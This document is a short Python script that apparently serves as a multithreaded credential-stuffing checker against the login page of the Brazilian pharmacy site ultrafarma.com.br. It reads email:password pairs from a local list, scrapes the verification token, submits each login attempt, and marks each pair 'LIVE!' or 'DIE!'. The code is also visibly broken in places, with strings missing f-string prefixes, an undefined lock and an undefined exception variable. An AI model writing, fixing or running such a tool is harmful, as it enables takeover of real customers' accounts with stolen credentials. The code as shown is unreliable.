import utils
import concurrent.futures
import sys
import base64
import json
import datetime
import traceback
import datetime
import os
from multiprocessing import Lock
from bs4 import BeautifulSoup

emaillist = "./accounts"
livelist = "./ultrafarma"

def check():
    try:
         lock.acquire()
         account = utils.save.removeFirstLine(emaillist).strip()
         [email, senha] =  account.split(':')
         session = utils.session(proxy=False)
         r = session.get('https://www.ultrafarma.com.br/identificacao')
         soup = BeautifulSoup(r.content, "html.parser")
         token = soup.find('input', {'name': 'RequestVerificationToken'})['value']
         data = '{"login": {email},"senha": {senha},"manterConectado":false}'
         headers = 'RequestVerificationToken: {token}'
         r = session.post('https://www.ultrafarma.com.br/api/login', headers=headers, data = data)
         if '"sucesso": false' in r:
             utils.colors.error('DIE!')
         elif '"sucesso": true' in r:
             utils.colors.correct('LIVE!')
         elif 'HTTPSConnectionPool' in str(e):
             utils.colors.info('PROXY!')
         else:
             utils.colors.info(r.text)
    except:
        utils.colors.info('ERROR', 'Contact administration. Level: 01')

if __name__ == "__main__":
    try:
        lista_len = utils.get_len(emaillist)
        utils.colors.correct(f"Loaded {lista_len}x items.")
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(input(1))) as executor:
            [executor.submit(check) for i in range(0, lista_len, 1)]
    except KeyboardInterrupt:
        pass
input('Acabou.')